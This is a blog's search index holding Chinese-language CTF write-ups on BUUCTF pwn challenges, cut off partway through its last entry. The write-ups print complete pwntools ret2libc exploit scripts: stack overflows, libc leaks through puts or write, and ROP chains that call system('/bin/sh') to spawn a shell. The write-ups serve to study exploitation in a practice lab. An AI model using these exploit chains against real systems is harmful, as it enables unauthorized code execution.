<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Pwn——ROP进阶练习</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E8%BF%9B%E9%98%B6%E7%BB%83%E4%B9%A0/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E8%BF%9B%E9%98%B6%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-OGeek2019-babyrop）"><a href="#例题（BUUCTF-OGeek2019-babyrop）" class="headerlink" title="例题（BUUCTF [OGeek2019]babyrop）"></a>例题（BUUCTF [OGeek2019]babyrop）</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/pwn5-1.png"></p><p>没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。</p><p>拖到ida观察，main函数中生成一个随机数，把这个随机数读入buf，buf作为参数传进sub_804871F()函数里，然后将该函数返回的结果作为参数再传进sub_80487D0()里</p><p>未发现system，binsh<br><img src="/images/pwn5-2.png"></p><p><strong>f2函数：</strong><br><img src="/images/pwn5-3.png"></p><p>终端输入0x20字节长的字符串到buf，buf数组长度为7，可以发生溢出，但溢出不到ret位置。<br>strcmp的特性是遇到’\0’就停止比较字符串，这里可以考虑0截断绕过。<br>最后函数把v5作为返回值。但是这个函数并没有对v5做出改动，结合栈图，可以猜测v5是被溢出改变了。</p><p><strong>f3函数：</strong></p><p><img src="/images/pwn5-4.png"><br>f3函数是把v5的值作为参数传入，进行条件判断运算。在第2个read中，只要a1足够大，就能发生栈溢出，并且能够溢出到ret位置。</p><p>这里的a1是上一个函数的返回值，看v5的地址，可以看到就在buf的地址里，我们只要在读入buf的时候将这个位置填上255（\xff），之后就会执行else，那么我们就可以对buf进行溢出了<br>buf数组长度为0x2c-0x25&#x3D;0x7</p><p><img src="/images/pwn5-5.png"></p><p>所以第一个payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload1</span> = b<span class="hljs-string">&quot;\x00&quot;</span> + b<span class="hljs-string">&quot;\xff&quot;</span>*(<span class="hljs-number">0</span>x2c-<span class="hljs-number">0</span>x25)<br></code></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>经过上面分析，找出了两个可以栈溢出的点。f3函数能让第二个read栈溢出成功的前提是传入的a1足够大，而v5就是a1。若要让v5足够大，在f2中必须溢出改变v5的值。若要能让f2成功返回v5，必须使用零截断绕过strncmp函数。</li><li>题目没有给出后门函数，这个二进制文件不是静态的，可以利用的gadget也不多。所以考虑使用retl2ibc构造system(“&#x2F;bin&#x2F;sh”)函数，这里利用write函数作为中间跳板获得其他函数的真实值。</li></ul><p>第二个payload主要对f3中的buf进行溢出，泄露libc地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload2=b&#x27;a&#x27;*(<span class="hljs-number">0</span>xe7+4)+p32(<span class="hljs-name">write_plt</span>)+p32(<span class="hljs-name">main</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">write_got</span>)+p32(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p>之后可以计算偏移量，构造rop。在这里我用题目给的libc文件打不通，并且main函数地址不能用elf.sym[“main”]，我也不知道为啥。最后还是用的LibcSearcher</p><p>第三个payload：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload3=b&#x27;a&#x27;*(<span class="hljs-number">0</span>xe7+4)+p32(<span class="hljs-name">system_addr</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">bin_sh</span>)<br></code></pre></td></tr></table></figure><h3 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,28508)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pwn&#x27;)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main = 0x08048825<br><br>payload1 = b<span class="hljs-string">&quot;\x00&quot;</span> + b<span class="hljs-string">&quot;\xff&quot;</span>*(0x2c-0x25)<br>r.sendline(payload1)<br>r.recvuntil(b<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-attribute">payload2</span>=b&#x27;a&#x27;*(0xe7+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)<br>r.sendline(payload2)<br><span class="hljs-attribute">write_addr</span>=u32(r.recv(4))<br><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">offset</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><span class="hljs-attribute">system_addr</span>=offset+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bin_sh</span>=offset+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>r.sendline(payload1)     #第二次发送payload1<br><br><span class="hljs-attribute">payload3</span>=b&#x27;a&#x27;*(0xe7+4)+p32(system_addr)+p32(0)+p32(bin_sh)<br><br>r.sendline(payload3)<br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>这里payload1是上传了两遍的，一开始没发现，导致卡了很久。。菜死我了orz</p><h2 id="例题2-（BUUCTF-bjdctf-2020-babyrop）"><a href="#例题2-（BUUCTF-bjdctf-2020-babyrop）" class="headerlink" title="例题2 （BUUCTF bjdctf_2020_babyrop）"></a>例题2 （BUUCTF bjdctf_2020_babyrop）</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>checksec，发现开了NX，是个64位程序。</p><p>拖到ida64，很简单一程序。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-built_in">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **envp</span>)</span><br>&#123;<br>  <span class="hljs-keyword">init</span>(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>vunl():</strong></p><p><img src="/images/pwn6-1.png"></p><p>buf存在栈溢出，根据题目也能看出来要泄露libc地址构造ROP。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>用<strong>puts</strong>函数找基址：</li></ul><p>可以与上面32位泄露做一个对比。这里用puts函数泄露（必须是已经调用过的函数）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts_plt=elf<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;puts&quot;</span>]</span><br>puts_got=elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;puts&quot;</span>]</span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br>pop_rdi_ret=<span class="hljs-number">0</span>x400733<br>main=elf<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;main&#x27;</span>]</span><br>start=<span class="hljs-number">0</span>x400530<br>ret=<span class="hljs-number">0</span>x400734<br>payload1=b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0</span>x28)+<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(puts_got)+<span class="hljs-built_in">p64</span>(puts_plt)+<span class="hljs-built_in">p64</span>(main)<br>#这里最后的<span class="hljs-built_in">p64</span>(main)也可以换成start的地址<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendline</span>(payload1)<br>puts=<span class="hljs-built_in">u64</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libcbase=puts-libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;puts&quot;</span>)<br>system=libcbase+libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;system&quot;</span>)<br>str_bin_sh=libcbase+libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br></code></pre></td></tr></table></figure><p>利用溢出，pop rdi放入返回地址，返回时执行，把puts的got表地址返回到rdi里，接下来ret到puts plt，puts-plt则是执行puts函数，rdi里是puts got的地址，而这个地址又指向puts的真实地址。也就是说，puts put了自己的真实地址<br>payload1写好后发送，变量puts接收了真实地址。这里用了个ljust。puts地址前6个字节有效，所以最后得人为添加’\x00’补全8字节（这里其实我也没太明白6个字节有效）。</p><p>puts真实地址减去偏移地址得到基址，基址加system的偏移地址得到system的真实地址。</p><ul><li>执行system<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload2=b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0</span>x28)+<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(str_bin_sh)+<span class="hljs-built_in">p64</span>(system)+<span class="hljs-built_in">p64</span>(ret)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendline</span>(payload2)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.interactive</span>()<br></code></pre></td></tr></table></figure>这里我在system地址后面跟了一个ret地址作为system执行的地址，按我之前看过的资料来说确实需要加上，但这里不加也能打通，这里有点不懂了。</li></ul><h3 id="完整exp：-1"><a href="#完整exp：-1" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">p</span>=remote(&quot;node4.buuoj.cn&quot;,27918)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./bjdctf_2020_babyrop&quot;)<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>p.recvuntil(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br><span class="hljs-attribute">pop_rdi_ret</span>=0x400733<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">start</span>=0x400530<br><span class="hljs-attribute">ret</span>=0x400734<br><span class="hljs-attribute">payload1</span>=b&quot;A&quot;*(0x28)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload1)<br><span class="hljs-attribute">puts</span>=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;puts&quot;,puts)<br><span class="hljs-attribute">libcbase</span>=puts-libc.dump(&quot;puts&quot;)<br><span class="hljs-attribute">system</span>=libcbase+libc.dump(&quot;system&quot;)<br><span class="hljs-attribute">str_bin_sh</span>=libcbase+libc.dump(&quot;str_bin_sh&quot;)<br><span class="hljs-attribute">payload2</span>=b&quot;A&quot;*(0x28)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system)+p64(ret)<br>p.recvuntil(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/images/pwn6-2.png"></p><p>跑这个脚本之前试过很多次都出现了“timeout: the monitored command dumped core”这个报错。原因是在选择libc版本时可以看到给了很多选项，我看都没看就选了第0个，怎么也打不通，后来换了第3个,问题解决</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Multi</span> Results:<br> <span class="hljs-attribute">0</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">1</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2_i386)<br> <span class="hljs-attribute">2</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">3</span>: ubuntu-xenial-amd64-libc6 (id libc6_2.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu10_amd64)<br> <span class="hljs-attribute">4</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu1_i386)<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> ret2libc：</p><ul><li>根据puts、write等函数泄露libc地址，注意32&#x2F;64位的区别（64位堆栈平衡问题、接收地址时是u32还是u64，接受的位数），以及write函数设置参数的问题。</li><li>计算偏移、system、binsh的地址</li><li>执行system（32&#x2F;64参数顺序问题）</li><li>ps.脚本和源程序放在LibcSearcher目录下哦</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ROP初尝试</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-2018-rop）"><a href="#例题（BUUCTF-2018-rop）" class="headerlink" title="例题（BUUCTF 2018_rop）"></a>例题（BUUCTF 2018_rop）</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/pwn4-1.png"></p><p>32位，开启了NX保护.</p><p>用ida看一下，主要函数就两个。<br><img src="/images/pwn4-2.png"></p><p><strong>main():</strong></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">int</span> <span class="hljs-function">__cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  be_nice_to_people();<br>  vulnerable_function();<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">0xD</span>u)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>vulnerable_function():</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">vulnerable_function</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[136]</span>; <span class="hljs-comment">// [esp+10h] [ebp-88h] BYREF</span><br><br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>&#125;<br></code></pre></td></tr></table></figure><p>buf很明显存在栈溢出，没有system 、&#x2F;bin&#x2F;sh,也没有其他信息了，是泄露libc类型的题目。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>利用write函数来泄露程序的libc版本</li><li>知道libc版本后去计算程序里的system函数和字符串“&#x2F;bin&#x2F;sh”的地址</li><li>覆盖返回地址为system（‘&#x2F;bin&#x2F;sh’），获取shell</li></ul><p><strong>1.泄露程序的libc版本：</strong></p><p>write函数说明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span>*buf,<span class="hljs-type">size_t</span> count)</span></span>;<br></code></pre></td></tr></table></figure><p>fd:是文件描述符（write所对应的是写，即就是1）<br>buf:通常是一个字符串，需要写入的字符串<br>count：是每次写入的字节数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span>x88+<span class="hljs-number">4</span>)+<span class="hljs-built_in">p32</span>(write_plt)+<span class="hljs-built_in">p32</span>(main)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p32</span>(write_got)+<span class="hljs-built_in">p32</span>(<span class="hljs-number">4</span>)<br>r<span class="hljs-selector-class">.sendline</span>(payload)<br>write_addr=<span class="hljs-built_in">u32</span>(r<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">4</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br></code></pre></td></tr></table></figure><p>首先填充造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）<br>p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位</p><p><strong>2.算出程序的偏移量，计算system和bin&#x2F;sh的地址</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">offset</span>=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)     <span class="hljs-comment">#计算偏移量</span><br>                                <span class="hljs-comment">#偏移量=程序里的函数地址-libc里的函数地址</span><br><span class="hljs-attr">system_addr</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-attr">bin_sh</span>=<span class="hljs-literal">off</span>set+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>3.构造rop获取shell</strong></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload=&#x27;a&#x27;*(<span class="hljs-number">0</span>x88+4)+p32(<span class="hljs-name">system_addr</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">bin_sh</span>)<br></code></pre></td></tr></table></figure><h3 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node3.buuoj.cn&#x27;,27043)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./2018_rop&#x27;)<br><br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)<br>r.sendline(payload)<br><span class="hljs-attribute">write_addr</span>=u32(r.recv(4))<br><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">offset</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><br><span class="hljs-attribute">system_addr</span>=offset+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bin_sh</span>=offset+libc.dump(&#x27;str_bin_sh&#x27;)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>这里一开始会报错，报错内容大概是LibcSearcher不能用，但是我确实安装了这个包，后来发现是因为没有将二进制程序和脚本放到LibcSearcher目录下。</p><p>放到同一目录下之后，再运行脚本：</p><p><img src="/images/pwn4-3.png"></p><p>匹配到了多个libc版本，选第一个，之后就可以查看flag了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn练习——32位栈溢出</title>
    <link href="/2023/09/18/Pwn%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%9432%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/09/18/Pwn%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%9432%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-ciscn-2019-ne-5）"><a href="#例题（BUUCTF-ciscn-2019-ne-5）" class="headerlink" title="例题（BUUCTF ciscn_2019_ne_5）"></a>例题（BUUCTF ciscn_2019_ne_5）</h2><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p><img src="/images/pwn3-4.png"></p><p>开启了nx保护。</p><p>运行程序试一试：</p><p><img src="/images/pwn3-1.png"></p><p>要求输入密码，从ida中看到密码为“administrator”，输入后看到几个选项，</p><p><img src="/images/pwn3-2.png"></p><p>下面依次看一下几个主要函数。</p><p><strong>main函数：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+0h] [ebp-100h] BYREF</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+4h] [ebp-FCh] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">124</span>]; <span class="hljs-comment">// [esp+8h] [ebp-F8h] BYREF</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+84h] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">char</span> v8[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+88h] [ebp-78h] BYREF</span><br>  <span class="hljs-type">int</span> *v9; <span class="hljs-comment">// [esp+F4h] [ebp-Ch]</span><br><br>  v9 = &amp;argc;<br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  *(_DWORD *)s1 = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v8, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v8));<br>  *(_DWORD *)src = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v6, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v6));<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to use LFS.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input admin password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%100s&quot;</span>, s1);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;administrator&quot;</span>) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Password Error!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span 